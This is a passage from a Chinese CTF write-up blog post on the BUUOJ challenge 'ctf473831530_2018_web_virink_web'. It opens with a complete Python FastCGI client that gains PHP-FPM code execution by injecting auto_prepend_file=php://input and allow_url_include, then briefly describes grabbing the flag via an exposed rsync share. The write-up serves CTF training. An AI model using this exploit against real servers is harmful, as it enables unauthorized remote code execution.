port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">    </span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line">    </span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, help=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, help=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, help=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, help=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % len(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    print(force_text(response))</span><br></pre></td></tr></table></figure>
+<p>我们利用这个进行RCE。问题是我们需要知道一个目标服务器上PHP文件的绝对路径。在扫80端口的时候我们发现他有一个redirect.php。大胆猜测一下Web1和Web2的路径是一样的，都在/www下，试一下。</p>
+<img src="/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/php-fpm.png" class="" title="PHP-FPM RCE">
+<p>看到Flag了，但是我们没有权限拿到。怎么办？我们似乎还有一个873 Rsync没有利用。参考<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/615669b7311f">这个</a>。看一下rsync的配置。Ubuntu默认将rsync的配置保存在/etc/rsyncd.conf中。src节中将路径设置在根下，满足条件。我们用rsync拖下来flag。</p>
+<img src="/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/rsync.png" class="" title="RSync get flag">
+<p>然后cat /tmp/7h1s_i5_f14g就可以拿到flag了。</p>
+
+    <div id="aplayer-emFHHukh" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="1992741" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{f85231ab-fe4c-46b7-801c-a9eb844b43e2}</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Tiaonmmn.ZMZ
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://tiaonmmn.github.io/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/" title="BUUOJ刷题-Web-ctf473831530_2018_web_virink_web">http://tiaonmmn.github.io/2019/09/09/BUUOJ刷题-Web-ctf473831530-2018-web-virink-web/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nd/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/BUUOJ/" rel="tag"><i class="fa fa-tag"></i> BUUOJ</a>
+              <a href="/tags/Shell/" rel="tag"><i class="fa fa-tag"></i> Shell</a>
+              <a href="/tags/PHP-FPM/" rel="tag"><i class="fa fa-tag"></i> PHP-FPM</a>
+              <a href="/tags/RSync/" rel="tag"><i class="fa fa-tag"></i> RSync</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/09/08/BUUOJ%E5%88%B7%E9%A2%98-Web-Online-Tool/" rel="prev" title="BUUOJ刷题-Web-Online-Tool">
+                  <i class="fa fa-chevron-left"></i> BUUOJ刷题-Web-Online-Tool
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2019/09/10/PASECACTF-2019-Flask-SSTI/" rel="next" title="PASECACTF 2019 Flask_SSTI">
+                  PASECACTF 2019 Flask_SSTI <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">flag{Lorem_ipsum}</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">296k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:29</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="//cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  const url = element.dataset.target;
+  const pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  const pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  const fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+<script>
+if (document.querySelectorAll('.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.7.0/dist/mermaid.min.js', () => {
+    mermaid.init({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    }, '.mermaid');
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+NexT.utils.loadComments('#valine-comments', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el  : '#valine-comments',
+      path: "/2019/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-ctf473831530-2018-web-virink-web/",
+    }, {"enable":true,"appId":"rGe4J3rLO75By3sjYfktvsyD-MdYXbMMI","appKey":"bpXDIRUBmowvz9tnMhIj6zs7","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":false,"comment_count":true,"recordIP":true,"serverURLs":null,"enableQQ":true,"requiredFields":[]}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
